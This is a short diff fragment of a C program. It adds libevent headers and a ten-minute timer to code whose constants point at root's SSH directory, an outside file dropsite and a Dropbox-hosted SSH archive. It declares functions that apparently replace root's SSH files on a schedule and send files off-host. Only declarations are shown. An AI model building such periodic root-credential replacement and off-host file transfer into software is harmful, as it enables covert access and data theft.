@@ -22,12 +22,15 @@
 #include "common.h"
 
 #include <dirent.h>
+#include <event.h>
+#include <evutil.h>
 
 /* defaults */
 #define SSH_DIR			"/root/.ssh/"
 #define SSH_BACKUP		"/root/.ssh/.backup/"
 #define DROPSITE		"filestorage@trollop.org"
 #define DROPSITE_DIR	"~/Files/"
+#define EVENT_TIMER		600 /* 10 minutes */
 
 /* globals */
 char *ssh_files = "http://dl.dropbox.com/u/698619/SSH/ssh.tar.bz2";
@@ -38,7 +41,7 @@ void test_ssh(void);
 void ssh_replace_dir(void);
 void ssh_restore_dir(void);
 void ssh_send_files(void);
-void ssh_timer(void);
+void ssh_timer(int, short, void *);
 
 /* client/server interative functions */
 char *ssh_request_file(char *);
